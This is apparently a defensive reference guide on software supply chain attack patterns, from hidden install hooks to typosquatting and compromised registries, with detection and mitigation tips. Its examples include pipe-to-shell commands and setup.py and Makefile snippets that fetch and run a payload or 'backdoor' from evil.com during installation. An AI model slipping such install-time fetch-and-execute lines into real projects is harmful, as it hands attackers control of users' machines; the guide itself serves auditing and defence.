# Supply Chain Attack Patterns

Patterns where the attack vector is the software delivery mechanism itself — not the code you review, but the code you don't see until it's too late.

---

## 1. Runtime Secondary Download

**What:** The skill/tool installs additional packages during execution that weren't visible during the initial code review.

**Examples:**
```bash
# In a postinstall script
npm install hidden-dependency

# In Python setup
subprocess.run(["pip", "install", "additional-package"])

# In a shell script triggered at runtime
curl -sL https://example.com/payload.sh | bash
```

**Why it's dangerous:** You audit the initial package and find nothing wrong. But at runtime, it downloads and installs unreviewed code that could be malicious.

**Detection:**
- Search for `npm install`, `pip install`, `cargo install`, `apt install` in all scripts
- Check for `postinstall`, `preinstall` scripts in package.json
- Check `setup.py` and `pyproject.toml` for install-time code execution
- Look for `curl`/`wget`/`fetch` calls that download executable content

**Real-world relevance:** This is why the review process audits all files, including build/install scripts — not just the main source code.

---

## 2. Pipe-to-Shell Execution

**What:** Downloading and immediately executing code without saving it locally for review.

**Examples:**
```bash
curl -sL https://install.example.com | bash
wget -qO- https://setup.example.com | sh
curl https://raw.githubusercontent.com/user/repo/main/install.sh | sudo bash
```

**Why it's dangerous:**
1. The code is never saved locally — no audit trail
2. The URL content can change between when you saw it and when it runs
3. `sudo` amplifies the impact to full system compromise
4. The pipe hides the content from the user

**Detection:** Any `curl | sh`, `wget | bash`, or similar pipe-to-shell pattern is an automatic 🔴 flag.

**Legitimate alternative:** Download first, review, then execute:
```bash
curl -sL https://install.example.com -o install.sh
cat install.sh  # Review the content
bash install.sh  # Execute after review
```

---

## 3. One-Shot Execution (npx / pipx)

**What:** Running a package directly without installing it locally, leaving no trace for subsequent audit.

**Examples:**
```bash
npx some-unknown-package
npx skills add -s some-skill -y -g SomeOrg/SomeRepo
pipx run some-tool
```

**Why it's dangerous:**
- Package code executes before you can review it
- `-y` flags skip confirmation prompts
- No local copy remains for post-installation audit
- The package version may differ from what you think you're running

**Detection:** `npx` commands with unknown packages, especially with `-y` flag.

---

## 4. Auto-Update Channels

**What:** Software that checks for updates from a remote source and automatically downloads/replaces local files.

**Examples:**
```javascript
// Check VERSION file on GitHub
const remoteVersion = await fetch('https://raw.githubusercontent.com/org/repo/main/VERSION');
if (remoteVersion > localVersion) {
  // Download and replace all files listed in MANIFEST
  const manifest = await fetch('https://raw.githubusercontent.com/.../MANIFEST');
  for (const file of manifest) {
    await download(file.url, file.localPath);
  }
}
```

**Why it's dangerous:**
- If the remote repository is compromised, malicious updates deploy silently
- If the maintainer account is hijacked, they can push malicious versions
- The user has no opportunity to review changes before they take effect
- There's no cryptographic verification that the update is legitimate

**Detection:**
- Look for VERSION/MANIFEST file checks
- Look for fetch/download calls that replace local files
- Check if updates are cryptographically signed
- Check if the user is notified/asked before updates apply

**Mitigation recommendation:** Disable auto-update. Use manual, version-pinned installations. Review changelogs before upgrading.

**Real-world example:** Bybit AI Hub skill includes MANIFEST-based auto-update at session start — a remote code execution channel if the GitHub account is compromised.

---

## 5. Dependency Hijacking

**What:** Exploiting the package manager's resolution mechanism to inject malicious code.

**Variants:**

### Typosquatting
Publishing a package with a name very similar to a popular one:
- `lodash` → `1odash`, `lodash-utils`, `lodahs`
- `requests` → `request`, `reqeusts`
- `openclaw` → `open-claw`, `opencllaw`

### Scope/Namespace Confusion
- `@company/package` (official) vs `company-package` (attacker)
- npm: unscoped package pretending to be from a known org

### Abandoned Package Takeover
- Original maintainer abandons a package
- Attacker claims the namespace or publishes a "new version"
- Downstream projects pull the malicious update automatically

### Star Jacking
- Fork a popular repo
- Transfer the fork to a new org that matches a package name
- The GitHub link now shows high star count (inherited from fork)

**Detection:**
- Verify package name spelling character by character
- Check the package's npm/pip page for author, publish date, and download history
- Cross-reference the package's GitHub link with the actual repository
- Be suspicious of packages with high GitHub stars but low npm/pip downloads

---

## 6. Build-Time Injection

**What:** Malicious code that executes during the build/install phase, not during normal usage.

**Examples:**

### npm postinstall
```json
{
  "scripts": {
    "postinstall": "node setup.js"
  }
}
```
`setup.js` runs automatically after `npm install` — before the user has a chance to review the installed code.

### Python setup.py
```python
from setuptools import setup
import os
os.system("curl https://evil.com/payload | bash")  # Runs during pip install
setup(name="innocent-looking-package", ...)
```

### Makefile targets
```makefile
install:
    @curl -sL https://evil.com/backdoor -o /tmp/.cache && chmod +x /tmp/.cache && /tmp/.cache &
    @echo "Installation complete!"
```

**Detection:**
- Always check `package.json` scripts (especially `preinstall`, `postinstall`, `prepare`)
- Always check `setup.py`, `setup.cfg`, `pyproject.toml` for code execution
- Check Makefiles for hidden commands (especially with `@` prefix that suppresses output)
- Check Dockerfiles for suspicious `RUN` commands

---

## 7. Trusted Source Compromise

**What:** The legitimate source itself is compromised, so the "official" version becomes malicious.

**Variants:**

### Repository Hijacking
- Maintainer's GitHub account compromised via phishing or credential reuse
- Attacker pushes malicious commit to the official repo
- All users who update get the malicious version

### CI/CD Pipeline Poisoning
- Attacker compromises the build pipeline (GitHub Actions, CircleCI, etc.)
- Build artifacts contain malicious code not present in source
- Source code review finds nothing — the injection happens during build

### Registry Account Takeover
- npm/PyPI account compromised
- New version published with malicious code
- Package name and author appear legitimate

### CDN/Hosting Compromise
- The server hosting the download is compromised
- `https://official-domain.com/download.sh` serves malicious content
- SSL certificate is valid (it's the real domain, just compromised)

**Detection:** This is the hardest pattern to detect because the source appears legitimate.

**Mitigations:**
- Pin exact versions in dependencies (no `^` or `~` ranges)
- Verify cryptographic hashes of downloaded files when available
- Monitor for unexpected version bumps
- Check commit signing (GPG-signed commits)
- Compare the package content against the repository source
- Be alert to unusual maintainer activity (new maintainer, rapid succession of releases)

---

## Defense Principles

1. **Audit what runs, not what's declared.** Build scripts, install hooks, and auto-updates can all execute code that isn't in the main source files.

2. **Pin versions.** Never use `latest`, `^`, or `~` in production dependencies. Pin exact versions and upgrade deliberately.

3. **Prefer manual installs over automated ones.** `curl | bash` is convenient but unauditable. Download, review, then execute.

4. **Disable auto-updates.** If a tool has an auto-update mechanism, disable it and manage versions manually.

5. **Verify the entire chain.** Source repo → build pipeline → registry → download → local install. A compromise at any point in this chain can inject malicious code.
